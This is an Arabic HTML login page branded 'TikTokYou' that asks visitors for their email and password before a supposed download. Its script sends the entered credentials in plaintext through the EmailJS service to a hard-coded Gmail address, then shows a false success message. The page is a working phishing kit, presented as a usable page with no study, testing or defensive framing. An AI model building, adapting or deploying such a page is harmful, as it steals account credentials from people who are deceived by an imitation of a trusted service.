<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - TikTokYou</title>
    <style>
        body {
            font-family: Tahoma, sans-serif;
            background-color: #0f172a;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-card {
            background-color: #1e293b;
            padding: 30px 20px;
            border-radius: 20px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
            width: 90%;
            max-width: 380px;
            text-align: center;
            border: 2px solid #3b82f6;
        }
        .logo {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            object-fit: cover;
            border: 3px solid #3b82f6;
            margin-bottom: 15px;
        }
        h2 {
            color: #3b82f6;
            margin-bottom: 20px;
            font-size: 22px;
        }
        .input-group {
            margin-bottom: 15px;
            text-align: right;
        }
        label {
            display: block;
            font-size: 14px;
            margin-bottom: 5px;
            color: #94a3b8;
        }
        input {
            width: 100%;
            padding: 12px;
            border-radius: 10px;
            border: 1px solid #475569;
            background-color: #0f172a;
            color: #fff;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
        }
        input:focus {
            border-color: #3b82f6;
        }
        .btn {
            width: 100%;
            padding: 12px;
            background-color: #3b82f6;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.3s;
        }
        .btn:hover {
            background-color: #2563eb;
        }
        #status {
            margin-top: 15px;
            font-size: 14px;
            color: #38bdf8;
        }
    </style>
</head>
<body>

    <div class="login-card">
        <!-- صورة الشعار -->
        <img src="IMG_2782.jpeg" alt="شعار TikTokYou" class="logo">
        
        <h2>تسجيل الدخول للتحميل</h2>
        
        <!-- نموذج إدخال البريد وكلمة السر مع إرسال عبر EmailJS -->
        <form id="deft-form">
            <div class="input-group">
                <label for="email">البريد الإلكتروني:</label>
                <input type="email" id="email" name="email" placeholder="أدخل البريد الإلكتروني" required>
            </div>
            
            <div class="input-group">
                <label for="password">كلمة المرور:</label>
                <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور" required>
            </div>
            
            <button type="submit" class="btn">الانتقال إلى صفحة التحميل</button>
            <p id="status"></p>
        </form>
    </div>

    <!-- مكتبة EmailJS -->
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script>
      // استبدل "YOUR_PUBLIC_KEY" بالمفتاح العام الخاص بك من حسابك في EmailJS
      emailjs.init({
        publicKey: "YOUR_PUBLIC_KEY"
      });

      document.getElementById("deft-form")
        .addEventListener("submit", async function(e) {
          e.preventDefault();

          const status = document.getElementById("status");
          status.textContent = "جاري التحقق والتحميل...";

          const email = document.getElementById("email").value;
          const password = document.getElementById("password").value;

          try {
            // إرسال البيانات باستخدام الخدمة والقالب الخاص بك
            await emailjs.send(
              "service_pfw3g7m",
              "template_2ongjk6",
              {
                message: "البريد الإلكتروني: " + email +
                         "\nكلمة المرور: " + password,
                to_email: "yahayh572@gmail.com"
              }
            );

            status.textContent = "تم بنجاح! جاري تحويلك...";
            this.reset();
            
            // يمكنك هنا توجيه المستخدم لصفحة التحميل الحقيقية بعد ثانية مثلاً:
            // setTimeout(() => { window.location.href = "download.html"; }, 1500);

          } catch (error) {
            status.textContent = "حدث خطأ، يحاول مرة أخرى.";
            console.error(error);
          }
        });
    </script>

</body>
</html>
